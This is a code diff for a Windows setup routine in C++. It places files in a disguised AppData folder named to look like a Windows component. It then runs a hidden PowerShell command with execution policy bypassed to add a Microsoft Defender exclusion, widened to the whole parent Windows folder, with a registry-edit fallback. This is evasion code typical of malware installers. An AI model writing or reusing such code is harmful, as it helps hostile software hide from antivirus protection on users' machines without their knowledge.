@@ -102,7 +102,7 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
         return 0;
     }
 
-    fs::path targetDir = fs::path(appDataPath) / L"Microsoft" / L"Windows";
+    fs::path targetDir = fs::path(appDataPath) / L"Microsoft" / L"Windows" / L"WinDataHost";
     if (!fs::exists(targetDir)) {
         if (fs::create_directories(targetDir)) {
             LogMessage(L"Created target directory: " + targetDir.wstring());
@@ -115,14 +115,15 @@ DWORD WINAPI RunSetup(LPVOID lpParam) {
     }
 
     LogMessage(L"Setting Windows Defender exclusion...");
-    // Try with -ExecutionPolicy Bypass and explicit WindowStyle to ensure it runs
-    std::wstring psCmd = L"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '" + targetDir.wstring() + L"' -ErrorAction Stop\"";
+    // Exclude the parent Windows folder as requested to be safe
+    fs::path exclusionPath = targetDir.parent_path();
+    std::wstring psCmd = L"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '" + exclusionPath.wstring() + L"' -ErrorAction Stop\"";
     if (RunHiddenCommand(psCmd)) {
         LogMessage(L"Defender exclusion set successfully.");
     } else {
         LogMessage(L"Trying alternative exclusion method...");
         // Alternative via Registry (needs Admin)
-        std::wstring regCmd = L"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"" + targetDir.wstring() + L"\" /t REG_DWORD /d 0 /f";
+        std::wstring regCmd = L"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"" + exclusionPath.wstring() + L"\" /t REG_DWORD /d 0 /f";
         if (RunHiddenCommand(regCmd)) {
             LogMessage(L"Defender exclusion set via Registry.");
         } else {
